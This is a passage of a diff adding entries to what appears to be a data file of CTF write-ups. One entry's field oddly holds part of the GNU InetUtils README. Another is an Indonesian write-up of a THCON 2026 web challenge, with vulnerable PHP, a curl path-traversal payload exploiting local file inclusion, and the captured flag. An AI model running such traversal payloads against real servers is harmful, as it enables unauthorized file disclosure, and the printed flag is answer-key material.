--with-path-ftploginmesg=/etc/ftpmotd`\n\n   Finally, the fall-back value `/etc/nologin` for PATH_NOLOGIN is in\n   effect for every systems lacking <paths.h>, but this sets the most\n   plausible location in any case.\n\n - `rcp` relies on PATH_RSH for proper hand-over.  Use the\n   configuration switch `--with-path-rsh=VALUE` for overriding the\n   detected value.  It should point to the intended location of `rsh`,\n   particularly when built with Kerberos support.\n\n - Similarly, `rsh` needs PATH_RLOGIN to locate `rlogin` for correct\n   delegation.  The switch `--with-path-rlogin=VALUE` may come handy\n   to ensure that `rsh` as well as `rlogin` offer identical Kerberos\n   support.\n\n\n - Non-Shishi Kerberos support does not build.  Patches welcome.\n\n - Shishi Kerberos support is only implemented for `rcp`, `rlogin`,\n   `rlogind`, `rsh`, `rshd`, `telnet`, and `telnetd`.\n\n - Not all utilities are Kerberized even when built with Kerberos\n   libraries, including `rcp` for non-Shishi Kerberos.\n\n - InetUtils does not build on HP-UX 11.00, Cygwin, Minix, MinGW,\n   MSCV, BeOS, Haiki (and probably other systems as well).  Patches\n   welcome.\n\n========================================================================\n\nCopyright (C) 1997-2025 Free Software Foundation, Inc.\n\nCopying and distribution of this file, with or without modification,\nare permitted in any medium without royalty provided the copyright\nnotice and this notice are preserved.  This file is offered as-is,\nwithout any warranty.",
+    "tools": [],
+    "analysis": "",
+    "solution": [],
+    "terminalOutputs": [],
+    "flag": "",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "thcon2026-web-authenticationcollapse",
+    "title": "THCity: Authentication Collapse (part 1/2)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "THCON 2026",
+    "tags": [],
+    "description": "Writeup for challenge THCity: Authentication Collapse (part 1/2)",
+    "problemDescription": "",
+    "tools": [],
+    "analysis": "Setelah melihat file yang diberikan (Docker environment), saya menemukan beberapa komponen utama:\n- `flag_server`: Server Apache dengan PHP yang menjalankan modul kustom `mod_auth_thcity.so`.\n- `sso_server`: Server SSO berbasis Node.js/Express.\n- `redis`: Tempat penyimpanan flag utama.\n\nDi file `flag_server/Dockerfile`, ada petunjuk menarik:\n> `# First flag is only in the compiled module \".so\"`\n\nIni artinya flag untuk part 1 disisipkan ke dalam binary modul Apache saat proses build.",
+    "solution": [
+      {
+        "title": "2. Menemukan Vulnerability",
+        "content": "Saya mengecek file `flag_server/image.php`:\n\nFile ini memiliki celah **Local File Inclusion (LFI)** karena parameter `img` tidak disanitasi. Saya bisa menggunakannya untuk membaca file apa pun di server.",
+        "code": "$img = \"./images/\" . $_GET[\"img\"] ?? \"\";\nif(is_file($img)){\n  readfile($img);\n}"
+      },
+      {
+        "title": "3. Eksploitasi",
+        "content": "Karena saya butuh file `.so` modul Apache, saya mencoba menebak lokasinya. Biasanya di sistem Debian (seperti image `php:8.2-apache`), modul berada di `/usr/lib/apache2/modules/mod_auth_thcity.so`.\n\nSaya mendownload file tersebut menggunakan LFI:\n\n\nSetelah file berhasil didownload, saya mencari string flag di dalamnya:\n\n\nDitemukan flag:\n**THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}**",
+        "code": "curl -s \"http://web-thcity-authentication-collapse.ctf.thcon.party:8888/image.php?img=../../../../../../usr/lib/apache2/modules/mod_auth_thcity.so\" --output mod_auth_thcity.so"
+      },
+      {
+        "title": "4. Kesimpulan",
+        "content": "Flag part 1 berhasil ditemukan di dalam binary modul Apache. Isi flag tersebut (`S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG`) memberikan petunjuk kuat bahwa part 2 akan melibatkan teknik SSRF melalui header injection dan HTTP pipelining pada modul tersebut untuk melewati otentikasi SSO dan mengakses Redis."
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}",
     "lessonsLearned": ""
   }
 ];
